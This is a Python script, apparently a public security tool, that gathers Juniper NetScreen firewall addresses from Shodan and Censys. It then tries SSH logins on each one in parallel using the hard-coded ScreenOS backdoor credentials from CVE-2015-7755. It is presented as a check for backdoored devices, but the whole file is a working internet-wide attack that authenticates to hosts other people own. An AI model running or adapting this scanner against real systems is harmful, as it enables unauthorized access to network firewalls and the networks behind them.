#!/usr/bin/python
# netscreen-backdoor-scanner.py: a very simple SHODAN/Censys + Paramiko scanner to
# check for backdoored Internet-facing Juniper ScreenOS devices
#
# for more information about this issue see Rapid7's blog post:
# https://community.rapid7.com/community/infosec/blog/2015/12/20/cve-2015-7755-juniper-screenos-authentication-backdoor
#
# with code from https://breakpoint-labs.com/reconnaissance-with-shodan-and-censys/
#
# by julio /// blog.whatever.io

import os
import sys
import Queue
import threading

try:
    import shodan
except:
    print "[!] Error importing 'shodan'. Please install it before running this script."
    sys.exit(0)

try:
    import censys
    from censys import *
except:
    print "[!] Error importing 'censys'. Please install it before running this script."
    sys.exit(0)
try:
    import paramiko
except:
    print "[!] Error importing 'paramiko'. Please install it before running this script."
    sys.exit(0)

# ---- Set defaults ----- #
SHODAN_API_KEY = "YOUR_API_KEY"
DEFAULT_SHODAN_PAGES = 50 # a page contains 100 results, 1 credit per page

CENSYS_API_ID = "YOUR_API_ID"
CENSYS_API_SECRET = "YOUR_API_SECRET"

DEFAULT_QUERY = "netscreen product:\"NetScreen sshd\""

BACKDOOR_USERNAME = "system"
BACKDOOR_PASSWORD = "<<< %s(un='%s') = %u"

MAX_THREADS = 5
VERBOSE = True

# --- Set globals --- #
queue = Queue.Queue()


def search_shodan(query):
    api = shodan.Shodan(SHODAN_API_KEY)

    try:
        save_results = open("shodan_results.txt", "w")
        save_ips = open("shodan_netscreen_ips.txt", "w")
    except IOError as err:
        print "[!] Error: %s" % err
        sys.exit(0)

    try:
        for i in range(DEFAULT_SHODAN_PAGES):
            results = api.search(query, page=i)
            t = "[+] Results found for %s: %s\n" % (query, results['total'])
            print t
            save_results.write(t)

            for result in results['matches']:
                ip = "%s\n" % result['ip_str']
                data = result['data'] + "\n"

                save_ips.write(ip)
                save_results.write(data)       
    except shodan.APIError as err:
        print "[!] Error: %s" % err

    save_results.close()
    save_ips.close()


def search_censys(query):
    api = censys.ipv4.CensysIPv4(api_id=CENSYS_API_ID, api_secret=CENSYS_API_SECRET)
    results = api.search(DEFAULT_QUERY)

    try:
        save_ips = open("censys_netscreen_ips.txt", "w")
    except IOError as err:
        print "[!] Error: %s" % err
        sys.exit(0)

    matches = results['metadata']['count']
    pagenum = matches / 100
    if matches % 100 != 0:
        pagenum += 1

    count = 1
    while count < pagenum:
        results = api.search(DEFAULT_QUERY, page=count)
        count += 1
        for result in results.get('results'):
            ip = result.get("ip")
            print ip
            save_ips.write(ip + "\n")

    save_ips.close()


def connect_to_ssh(host, bd_username, bd_password):
    try:
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(host, username=bd_username, password=bd_password)
        print "[*] Backdoor account found: %s" % host
    except paramiko.AuthenticationException as err:
        if VERBOSE:
            print "[!] Authentication failed to %s" % (host)
    except paramiko.SSHException as err:
        if VERBOSE:
            print "[!] Failed to connect to %s: %s" % (host, err)
    except Exception as err:
        if VERBOSE:
            print "[!] Error connecting to %s: %s" % (host, err)

class ThreadSSHClient(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        while True:
            host = self.queue.get()
            if VERBOSE:
                print "[+] Connecting to %s with the backdoor account...\n" % host
            connect_to_ssh(host, BACKDOOR_USERNAME, BACKDOOR_PASSWORD)
            self.queue.task_done()


def main():
    #search_shodan(DEFAULT_QUERY)
    search_censys(DEFAULT_QUERY)

    for i in range(MAX_THREADS):
        worker = ThreadSSHClient(queue)
        worker.setDaemon(True)
        worker.start()

    list_hosts = open("censys_netscreen_ips.txt", "r").read().splitlines()
    for line in list_hosts:
        queue.put(line)

    queue.join()


if __name__ == '__main__':
    main()
